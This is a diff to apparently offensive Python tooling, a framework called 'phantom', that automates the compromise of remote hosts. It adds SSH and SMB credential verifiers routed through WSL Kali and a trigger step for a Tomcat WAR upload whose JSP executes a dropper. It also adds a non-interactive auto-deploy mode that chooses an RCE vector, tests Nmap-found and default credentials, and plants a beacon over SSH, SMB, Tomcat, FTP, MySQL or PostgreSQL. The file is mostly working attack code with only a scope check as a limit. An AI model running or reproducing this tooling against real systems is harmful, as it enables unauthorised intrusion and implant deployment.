@@ -10,6 +10,7 @@ Pipeline credenziali (unificata per tutti i servizi):
 
 import os
 import re
+import shutil
 import subprocess
 import xml.etree.ElementTree as ET
 from typing import List, Dict, Optional, Tuple
@@ -17,6 +18,33 @@ from phantom.utils.notifier import notifier
 from rich.console import Console
 
 console = Console()
+
+
+def _wsl_tool(tool: str) -> Optional[str]:
+    """Resolve a Linux tool through the Kali WSL distro (Windows hosts).
+
+    The credential verifiers invoke sshpass/smbclient/hydra — on a Windows
+    operator box those binaries live in the WSL Kali toolbox, not on the
+    native PATH. Returns the argv prefix (['wsl', '-d', <distro>]) or None.
+    """
+    if os.name != "nt":
+        return None
+    try:
+        from phantom.automation.runtime.toolchain import _wsl_which
+        wrapper = _wsl_which(tool)
+        if not wrapper:
+            return None
+        # wrapper is "wsl -d <distro> <tool>" or "wsl -e <tool>"
+        return wrapper.rsplit(" ", 1)[0]
+    except Exception:
+        return None
+
+
+def _have_tool(tool: str) -> bool:
+    """Tool present natively or in the WSL toolbox."""
+    if shutil.which(tool):
+        return True
+    return _wsl_tool(tool) is not None
 
 
 # =============================================================================
@@ -338,39 +366,59 @@ def detect_rce_vectors(ports: List[Dict]) -> List[Dict]:
 # Restituisce True se le credenziali sono valide.
 
 def _verify_ssh(target: str, port: int, username: str, password: str) -> Optional[bool]:
-    """Verifica credenziali SSH via sshpass + echo OK. Restituisce None se il tool manca."""
+    """Verifica credenziali SSH via sshpass + echo OK. Restituisce None se il tool manca.
+
+    Tries the modern defaults first: the legacy KEX/host-key options that
+    unlock Metasploitable2-era servers BREAK auth against modern OpenSSH
+    (9.x) — "Permission denied" even with valid credentials. Legacy
+    algorithms are only re-added when the plain attempt fails with an
+    algorithm-negotiation error.
+    """
     import shutil
-    if not shutil.which("sshpass"):
+    if not _have_tool("sshpass"):
         return None
-    try:
-        cmd = [
-            "sshpass", "-p", password,
-            "ssh", "-o", "StrictHostKeyChecking=no",
+    # NOTE: BatchMode=yes must NOT be set — it disables the interactive
+    # password prompt entirely, so sshpass can never feed the password and
+    # every attempt fails with "Permission denied" even for valid creds.
+    head = ["sshpass", "-p", password, "ssh",
+            "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null",
-            "-o", "ConnectTimeout=3",
-            "-o", "BatchMode=yes",
-            # Legacy algorithms for older targets like Metasploitable2
-            "-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
-            "-o", "HostKeyAlgorithms=+ssh-rsa",
-            f"{username}@{target}", "-p", str(port),
-            "echo OK",
-        ]
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
-        return result.returncode == 0 and "OK" in result.stdout
-    except (subprocess.TimeoutExpired, OSError):
-        return False
+            "-o", "ConnectTimeout=3"]
+    # Windows host: route through the WSL Kali distro (argv-prefix rewrite)
+    wsl = _wsl_tool("sshpass")
+    if wsl:
+        head = wsl.split() + head
+        tail = [f"{username}@{target}", "-p", str(port), "echo OK"]
+    else:
+        tail = [f"{username}@{target}", "-p", str(port), "echo OK"]
+    legacy = ["-o", "KexAlgorithms=+diffie-hellman-group1-sha1",
+              "-o", "HostKeyAlgorithms=+ssh-rsa"]
+    for extra in ([], legacy):
+        try:
+            result = subprocess.run(head + extra + tail,
+                                    capture_output=True, text=True, timeout=5)
+        except (subprocess.TimeoutExpired, OSError):
+            return False
+        if result.returncode == 0 and "OK" in result.stdout:
+            return True
+        if "Unable to negotiate" in result.stderr or "no matching key" in result.stderr:
+            continue  # algorithm mismatch — retry with the legacy set
+    return False
 
 
 def _verify_smb(target: str, port: int, username: str, password: str) -> bool:
     """Verifica credenziali SMB via smbclient su IPC$."""
-    if not _check_tool("smbclient"):
+    if not _have_tool("smbclient"):
         return False
     try:
         cmd = [
             "smbclient", f"-U", f"{username}%{password}",
-            f"\\\\{target}\\IPC$", "-c", "quit",
+            f"\\\\\\\\{target}\\\\IPC$", "-c", "quit",
             "-t", "5",
         ]
+        wsl = _wsl_tool("smbclient")
+        if wsl:
+            cmd = wsl + cmd
         result = subprocess.run(cmd, capture_output=True, text=True, timeout=8)
         return result.returncode == 0
     except (subprocess.TimeoutExpired, OSError):
@@ -527,7 +575,7 @@ def ask_credentials(
         None se l'utente cancella o se tutto fallisce.
     """
     # Metodi che non richiedono credenziali
-    if method in ("http_cmd_injection", "http_cms_rce"):
+    if method == "http_cmd_injection":
         path = input("  HTTP vulnerable path [/]: ").strip() or "/"
         return {"path": path, "source": "manual"}
 
@@ -813,8 +861,9 @@ def deploy_beacon_via_tomcat(
 
         with tempfile.TemporaryDirectory() as tmpdir:
             # Crea una JSP che esegue il dropper
+            escaped = dropper.replace('"', '\\"')
             jsp_content = f"""<%
-Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{dropper.replace('"', '\\\\"')}"}});
+Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{escaped}"}});
 %>"""
 
             jsp_path = f"{tmpdir}/exec.jsp"
@@ -839,8 +888,17 @@ Runtime.getRuntime().exec(new String[]{{"sh", "-c", "{dropper.replace('"', '\\\\
                 )
 
             if resp.status_code in (200, 201):
-                notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
-                return True, resp.text
+                # Upload alone proves nothing: the WAR must be TRIGGERED so
+                # the JSP actually executes the dropper on the target.
+                trigger_url = f"http://{target}:{port}/beacon/exec.jsp"
+                try:
+                    trigger = requests.get(trigger_url, timeout=15, verify=False)
+                    if trigger.status_code == 200:
+                        notifier.success(f"Beacon deployed via Tomcat WAR to {target}")
+                        return True, f"WAR deployed and JSP triggered ({trigger.status_code})"
+                    return False, f"WAR uploaded but JSP trigger failed: HTTP {trigger.status_code}"
+                except Exception as e:
+                    return False, f"WAR uploaded but JSP trigger failed: {e}"
             else:
                 return False, f"Tomcat upload failed: {resp.text}"
 
@@ -1078,7 +1136,6 @@ def deploy_beacon(target: str, dropper: str) -> bool:
         "mysql_udf_rce":    lambda: deploy_beacon_via_mysql(target, port, creds["username"], creds["password"], dropper),
         "postgresql_rce":   lambda: deploy_beacon_via_postgresql(target, port, creds["username"], creds["password"], dropper),
         "http_cmd_injection": lambda: execute_http_rce(target, port, dropper, creds.get("path", "/")),
-        "http_cms_rce":     lambda: (notifier.warn("CMS RCE requires manual exploitation. Use generic HTTP injection."), (False, "")),
     }
 
     deploy_fn = deploy_map.get(method)
@@ -1095,3 +1152,172 @@ def deploy_beacon(target: str, dropper: str) -> bool:
     else:
         notifier.error(f"Beacon deployment failed via {method}: {output[:200]}")
         return False
+
+
+# =============================================================================
+# SEZIONE 8: AUTO DEPLOY (non-interactivo per auto-mode)
+# =============================================================================
+
+def auto_select_vector(vectors: List[Dict], os_info: Dict, aggressive: bool = False) -> Optional[Dict]:
+    """Seleziona automaticamente il miglior vettore RCE.
+    
+    Priorità:
+      - Se OS è Windows → SMB (psexec/wmiexec)
+      - Se OS è Linux → SSH (se credenziali disponibili)
+      - Altrimenti → primo vettore con priorità più alta
+      - In modalità aggressiva → prova anche HTTP command injection
+    """
+    os_name = os_info.get("name", "").lower() if os_info else ""
+    is_windows = any(k in os_name for k in ("windows", "microsoft", "win"))
+    is_linux = any(k in os_name for k in ("linux", "unix", "ubuntu", "debian", "centos", "red hat"))
+
+    for vec in vectors:
+        if is_windows and vec["method"] in ("smb_rce",):
+            return vec
+        if is_linux and vec["method"] in ("ssh",):
+            return vec
+        if vec["method"] in ("http_tomcat_rce", "mysql_udf_rce", "postgresql_rce", "ftp_upload_rce"):
+            return vec
+
+    if aggressive:
+        for vec in vectors:
+            if vec["method"] == "http_cmd_injection":
+                return vec
+
+    return vectors[0] if vectors else None
+
+
+def auto_try_credentials(method: str, target: str, port: int, nmap_creds: Optional[List[Dict]] = None) -> Optional[Dict]:
+    """Pipeline automatica senza interazione utente.
+    
+    Prova solo:
+      1. Credenziali da Nmap
+      2. Default credentials
+      Non chiede mai input manuale.
+    """
+    service = _METHOD_TO_SERVICE.get(method)
+    if not service:
+        return None
+
+    verifier = _VERIFIERS.get(method)
+
+    # STEP 1: Credenziali da Nmap
+    if nmap_creds and verifier:
+        for cred in nmap_creds:
+            u = cred.get("username")
+            p = cred.get("password")
+            if u and p:
+                console.print(f"    [cyan][*] Testing Nmap credentials: {u}:{p}[/]")
+                if verifier(target, port, u, p):
+                    notifier.success(f"Nmap credentials are valid: {u}:{p}")
+                    return {"username": u, "password": p, "source": "nmap"}
+
+    # STEP 2: Default credentials
+    defaults = DEFAULT_CREDENTIALS.get(service, [])
+    if defaults and verifier:
+        console.print(f"    [cyan][*] Trying {len(defaults)} default credential pairs for {service}...[/]")
+        for u, p in defaults:
+            if verifier(target, port, u, p):
+                notifier.success(f"Default credentials found: {u}:{p}")
+                return {"username": u, "password": p, "source": "default"}
+
+    return None
+
+
+def auto_deploy_beacon(target: str, dropper: str, aggressive: bool = False) -> bool:
+    """
+    Versione completamente automatica di deploy_beacon.
+    Nessuna interazione utente — decide tutto da sola.
+
+    Scope discipline: a target outside the configured engagement scope is
+    refused before any credential test or deploy attempt.
+
+    Returns:
+        True se beacon deployato con successo
+        False altrimenti
+    """
+    from phantom.core.session import session
+    from phantom.core.scope import is_in_scope
+
+    if session.scope and not is_in_scope(target, session.scope):
+        notifier.error(f"Target {target} is OUT OF SCOPE — auto-deploy refused.")
+        return False
+
+    ports, os_info, found_creds = parse_scan_xml(target)
+
+    if not ports:
+        scan_results = session.get_result("scan")
+        if scan_results:
+            ports, os_info, found_creds = parse_scan_results(scan_results)
+
+    if not ports:
+        notifier.error(f"No open ports found for {target}. Cannot auto-deploy.")
+        return False
+
+    # Salva nella knowledge base
+    kb = session.knowledge_base
+    kb["services"] = ports
+    kb["os_info"] = os_info
+    kb["creds_found"] = found_creds
+
+    console.print(f"\n[cyan][*] Auto-deploy: {len(ports)} open ports detected[/]")
+    if os_info:
+        console.print(f"    OS: {os_info.get('name', 'Unknown')}")
+
+    vectors = detect_rce_vectors(ports)
+    kb["rce_vectors"] = vectors
+
+    if not vectors:
+        notifier.error("No RCE vectors detected.")
+        return False
+
+    # Seleziona automaticamente il miglior vettore
+    selected = auto_select_vector(vectors, os_info, aggressive)
+    if not selected:
+        notifier.error("Could not select RCE vector.")
+        return False
+
+    method = selected["method"]
+    port = selected["port"]
+    notifier.info(f"Auto-selected RCE vector: {selected['description']}")
+
+    # Pipeline credenziali automatica
+    if method in ("http_cmd_injection",):
+        creds = {"path": "/", "source": "auto"}
+    else:
+        creds = auto_try_credentials(method, target, port, nmap_creds=found_creds)
+        if not creds:
+            notifier.warn(f"No valid credentials found for {method} on {target}:{port}")
+            if aggressive:
+                notifier.info("Aggressive mode: trying default credentials on "
+                              "the selected vector only (no unbounded brute force).")
+                creds = auto_try_credentials(method, target, port)
+            if not creds:
+                notifier.error(f"Cannot deploy: no credentials for {method}")
+                return False
+
+    # Deploy
+    deploy_map = {
+        "ssh":              lambda: deploy_beacon_via_ssh(target, port, creds["username"], creds["password"], dropper),
+        "smb_rce":          lambda: deploy_beacon_via_smb(target, creds["username"], creds["password"], dropper),
+        "http_tomcat_rce":  lambda: deploy_beacon_via_tomcat(target, port, creds["username"], creds["password"], dropper),
+        "ftp_upload_rce":   lambda: deploy_beacon_via_ftp(target, port, creds["username"], creds["password"], dropper),
+        "mysql_udf_rce":    lambda: deploy_beacon_via_mysql(target, port, creds["username"], creds["password"], dropper),
+        "postgresql_rce":   lambda: deploy_beacon_via_postgresql(target, port, creds["username"], creds["password"], dropper),
+        "http_cmd_injection": lambda: execute_http_rce(target, port, dropper, creds.get("path", "/")),
+    }
+
+    deploy_fn = deploy_map.get(method)
+    if not deploy_fn:
+        notifier.warn(f"RCE method '{method}' not implemented for auto-deploy.")
+        return False
+
+    success, output = deploy_fn()
+
+    kb["beacon_deployed"] = success
+    if success:
+        notifier.success(f"Beacon auto-deployed to {target} via {method}")
+    else:
+        notifier.error(f"Auto-deploy failed via {method}: {output[:200]}")
+
+    return success
